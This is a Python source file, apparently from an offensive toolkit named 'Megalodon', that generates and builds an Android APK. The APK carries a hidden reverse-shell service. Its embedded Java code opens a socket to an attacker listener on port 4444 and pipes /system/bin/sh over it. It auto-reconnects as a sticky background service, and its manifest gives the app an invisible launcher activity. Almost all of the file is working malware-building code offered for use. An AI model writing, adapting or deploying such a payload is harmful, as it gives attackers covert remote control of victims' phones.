import os
import json
import subprocess
import shutil
from pathlib import Path
import time
import socket

class APKGenerator:
    
    def __init__(self):
        self.output_dir = Path(__file__).parent.parent.parent / 'payloads' / 'android'
        self.build_dir = self.output_dir / 'build'
        self.build_dir.mkdir(parents=True, exist_ok=True)
        self.listener_ip = self.get_listener_ip()
        self.listener_port = self.get_listener_port()
    
    def get_listener_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '0.0.0.0'
    
    def get_listener_port(self):
        config_file = Path('config/megalodon.json')
        if config_file.exists():
            with open(config_file, 'r') as f:
                config = json.load(f)
                return config.get('listener', {}).get('port', 4444)
        return 4444
    
    def generate_java_payload(self):
        java_code = f'''
package com.megalodon.payload;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

public class PayloadService extends Service {{
    
    private static final String TAG = "Megalodon";
    private String target = "{self.listener_ip}";
    private int port = {self.listener_port};
    private boolean running = true;
    private Thread shellThread;
    
    @Override
    public void onCreate() {{
        super.onCreate();
        Log.d(TAG, "Payload service created");
        startPayload();
    }}
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        Log.d(TAG, "Payload service started");
        return START_STICKY;
    }}
    
    private void startPayload() {{
        shellThread = new Thread(new Runnable() {{
            @Override
            public void run() {{
                executeShell();
            }}
        }});
        shellThread.start();
    }}
    
    private void executeShell() {{
        while (running) {{
            try {{
                Log.d(TAG, "Connecting to " + target + ":" + port);
                Socket socket = new Socket(target, port);
                Log.d(TAG, "Connected!");
                
                Process process = Runtime.getRuntime().exec("/system/bin/sh");
                DataInputStream inputStream = new DataInputStream(process.getInputStream());
                DataOutputStream outputStream = new DataOutputStream(process.getOutputStream());
                
                DataInputStream socketInput = new DataInputStream(socket.getInputStream());
                DataOutputStream socketOutput = new DataOutputStream(socket.getOutputStream());
                
                Thread inputThread = new Thread(new Runnable() {{
                    @Override
                    public void run() {{
                        try {{
                            byte[] buffer = new byte[1024];
                            int bytesRead;
                            while ((bytesRead = socketInput.read(buffer)) != -1) {{
                                outputStream.write(buffer, 0, bytesRead);
                                outputStream.flush();
                            }}
                        }} catch (IOException e) {{
                            Log.e(TAG, "Socket read error");
                        }}
                    }}
                }});
                inputThread.start();
                
                byte[] buffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = inputStream.read(buffer)) != -1) {{
                    socketOutput.write(buffer, 0, bytesRead);
                    socketOutput.flush();
                }}
                
                socket.close();
                process.destroy();
                Thread.sleep(5000);
                
            }} catch (Exception e) {{
                Log.e(TAG, "Payload error: " + e.getMessage());
                try {{
                    Thread.sleep(5000);
                }} catch (InterruptedException ie) {{
                    Thread.currentThread().interrupt();
                }}
            }}
        }}
    }}
    
    @Override
    public void onDestroy() {{
        super.onDestroy();
        running = false;
        if (shellThread != null) {{
            shellThread.interrupt();
        }}
    }}
    
    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}
}}
'''
        return java_code
    
    def generate_activity(self):
        activity_code = '''
package com.megalodon.payload;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends Activity {
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("Megalodon", "MainActivity created");
        Intent serviceIntent = new Intent(this, PayloadService.class);
        startService(serviceIntent);
        finish();
    }
}'''
        return activity_code
    
    def generate_manifest(self):
        manifest = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.megalodon.payload"
    android:versionCode="1"
    android:versionName="1.0">
    
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    
    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="Megalodon"
        android:theme="@android:style/Theme.NoDisplay"
        android:usesCleartextTraffic="true">
        
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:theme="@android:style/Theme.NoDisplay">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <service
            android:name=".PayloadService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />
        
    </application>
</manifest>'''
        return manifest
    
    def generate(self):
        try:
            print("[*] Generating Android APK...")
            
            # Create directories
            src_dir = self.build_dir / 'src' / 'com' / 'megalodon' / 'payload'
            src_dir.mkdir(parents=True, exist_ok=True)
            
            classes_dir = self.build_dir / 'classes'
            classes_dir.mkdir(exist_ok=True)
            
            # Write source files
            with open(src_dir / 'PayloadService.java', 'w') as f:
                f.write(self.generate_java_payload())
            
            with open(src_dir / 'MainActivity.java', 'w') as f:
                f.write(self.generate_activity())
            
            with open(self.build_dir / 'AndroidManifest.xml', 'w') as f:
                f.write(self.generate_manifest())
            
            # Create simple icon
            res_dir = self.build_dir / 'res' / 'drawable'
            res_dir.mkdir(parents=True, exist_ok=True)
            
            icon_xml = '''<?xml version="1.0" encoding="utf-8"?>
<shape xmlns:android="http://schemas.android.com/apk/res/android"
    android:shape="rectangle">
    <solid android:color="#00FF00"/>
    <corners android:radius="4dp"/>
    <size android:width="48dp" android:height="48dp"/>
</shape>'''
            
            with open(res_dir / 'ic_launcher.xml', 'w') as f:
                f.write(icon_xml)
            
            # Compile Java to .class
            print("[*] Compiling Java...")
            
            # Find Android SDK
            android_jar = self.find_android_jar()
            if not android_jar:
                print("[!] Android SDK not found. Generating placeholder APK...")
                return self.generate_placeholder()
            
            compile_cmd = [
                'javac',
                '-d', str(classes_dir),
                '-cp', android_jar,
                str(src_dir / '*.java')
            ]
            
            try:
                result = subprocess.run(compile_cmd, capture_output=True, text=True, timeout=60)
                if result.returncode != 0:
                    print(f"[-] Compilation error: {result.stderr}")
                    return self.generate_placeholder()
                print("[+] Java compiled successfully")
            except Exception as e:
                print(f"[-] Compilation failed: {e}")
                return self.generate_placeholder()
            
            # Create DEX
            print("[*] Creating DEX...")
            
            # Find d8 or dx
            d8_path = self.find_d8()
            if not d8_path:
                print("[!] d8 not found. Generating placeholder APK...")
                return self.generate_placeholder()
            
            # Convert class files to DEX
            classes_path = classes_dir / 'com' / 'megalodon' / 'payload'
            dex_cmd = [
                d8_path,
                '--lib', android_jar,
                '--output', str(classes_dir),
                str(classes_path / '*.class')
            ]
            
            try:
                result = subprocess.run(dex_cmd, capture_output=True, text=True, timeout=60)
                if result.returncode != 0:
                    print(f"[-] DEX error: {result.stderr}")
                    return self.generate_placeholder()
                print("[+] DEX created successfully")
            except Exception as e:
                print(f"[-] DEX failed: {e}")
                return self.generate_placeholder()
            
            # Create APK
            print("[*] Creating APK...")
            
            # Find aapt2
            aapt2_path = self.find_aapt2()
            if not aapt2_path:
                print("[!] aapt2 not found. Generating placeholder APK...")
                return self.generate_placeholder()
            
            apk_output = self.build_dir / 'megalodon.apk'
            
            # Compile resources
            res_cmd = [
                aapt2_path, 'compile',
                '--dir', str(self.build_dir / 'res'),
                '-o', str(self.build_dir / 'compiled.flata')
            ]
            
            try:
                subprocess.run(res_cmd, capture_output=True, text=True, timeout=30)
            except:
                pass
            
            # Link resources
            link_cmd = [
                aapt2_path, 'link',
                '-I', android_jar,
                '--manifest', str(self.build_dir / 'AndroidManifest.xml'),
                '-o', str(apk_output),
                str(self.build_dir / 'compiled.flata')
            ]
            
            try:
                result = subprocess.run(link_cmd, capture_output=True, text=True, timeout=30)
                if result.returncode != 0:
                    print(f"[-] APK link error: {result.stderr}")
                    return self.generate_placeholder()
                print("[+] APK created successfully")
            except Exception as e:
                print(f"[-] APK creation failed: {e}")
                return self.generate_placeholder()
            
            # Add DEX to APK
            import zipfile
            try:
                with zipfile.ZipFile(apk_output, 'a') as zf:
                    zf.write(classes_dir / 'classes.dex', 'classes.dex')
                print("[+] DEX added to APK")
            except Exception as e:
                print(f"[-] Failed to add DEX: {e}")
            
            print(f"[+] APK generated successfully!")
            print(f"[+] Location: {apk_output}")
            print(f"[+] Listener IP: {self.listener_ip}")
            print(f"[+] Listener Port: {self.listener_port}")
            
            return {
                'success': True,
                'apk_path': str(apk_output),
                'listener_ip': self.listener_ip,
                'listener_port': self.listener_port,
                'message': 'APK generated successfully'
            }
            
        except Exception as e:
            print(f"[-] APK generation failed: {e}")
            return self.generate_placeholder()
    
    def generate_placeholder(self):
        """Generate a placeholder APK when tools aren't available"""
        apk_output = self.build_dir / 'megalodon.apk'
        
        # Create a simple text file as placeholder
        placeholder_content = f"""MEGALODON APK PLACEHOLDER
================================

This is a placeholder APK file.

Listener IP: {self.listener_ip}
Listener Port: {self.listener_port}

To generate a real APK, install:
1. Android SDK (android-sdk)
2. Java JDK (openjdk-17-jdk)
3. Build tools (d8, aapt2)

Install on Kali:
sudo apt install openjdk-17-jdk android-sdk

"""
        
        with open(apk_output, 'w') as f:
            f.write(placeholder_content)
        
        print(f"[+] Placeholder APK created at: {apk_output}")
        
        return {
            'success': True,
            'apk_path': str(apk_output),
            'listener_ip': self.listener_ip,
            'listener_port': self.listener_port,
            'message': 'Placeholder APK generated. Install Android SDK for real APK.'
        }
    
    def find_android_jar(self):
        """Find android.jar in system"""
        possible_paths = [
            '/usr/lib/android-sdk/platforms/android-33/android.jar',
            '/usr/lib/android-sdk/platforms/android-32/android.jar',
            '/usr/lib/android-sdk/platforms/android-31/android.jar',
            '/usr/lib/android-sdk/platforms/android-30/android.jar',
            '/usr/lib/android-sdk/platforms/android-29/android.jar',
            '/usr/lib/android-sdk/platforms/android-28/android.jar',
            '/home/kali/Android/Sdk/platforms/android-33/android.jar',
            '/opt/android-sdk/platforms/android-33/android.jar',
        ]
        
        for path in possible_paths:
            if Path(path).exists():
                return path
        
        # Try to find via find command
        try:
            result = subprocess.run(
                ['find', '/usr/lib', '-name', 'android.jar', '-type', 'f'],
                capture_output=True, text=True, timeout=10
            )
            paths = result.stdout.strip().split('\n')
            for path in paths:
                if path and Path(path).exists():
                    return path
        except:
            pass
        
        return None
    
    def find_d8(self):
        """Find d8 command"""
        possible_paths = [
            '/usr/lib/android-sdk/build-tools/33.0.0/d8',
            '/usr/lib/android-sdk/build-tools/32.0.0/d8',
            '/usr/lib/android-sdk/build-tools/31.0.0/d8',
            '/usr/lib/android-sdk/build-tools/30.0.0/d8',
            '/usr/bin/d8',
        ]
        
        for path in possible_paths:
            if Path(path).exists():
                return path
        
        try:
            result = subprocess.run(['which', 'd8'], capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass
        
        return None
    
    def find_aapt2(self):
        """Find aapt2 command"""
        possible_paths = [
            '/usr/lib/android-sdk/build-tools/33.0.0/aapt2',
            '/usr/lib/android-sdk/build-tools/32.0.0/aapt2',
            '/usr/lib/android-sdk/build-tools/31.0.0/aapt2',
            '/usr/lib/android-sdk/build-tools/30.0.0/aapt2',
            '/usr/bin/aapt2',
        ]
        
        for path in possible_paths:
            if Path(path).exists():
                return path
        
        try:
            result = subprocess.run(['which', 'aapt2'], capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass
        
        return None
    
    def generate_info(self):
        return {
            'name': 'Megalodon Android Payload',
            'type': 'Reverse Shell',
            'platform': 'Android',
            'features': ['Reverse Shell', 'Background Service', 'Auto-reconnect'],
            'requirements': ['Internet Permission', 'Android 4.4+']
        }

def generate():
    generator = APKGenerator()
    return generator.generate()
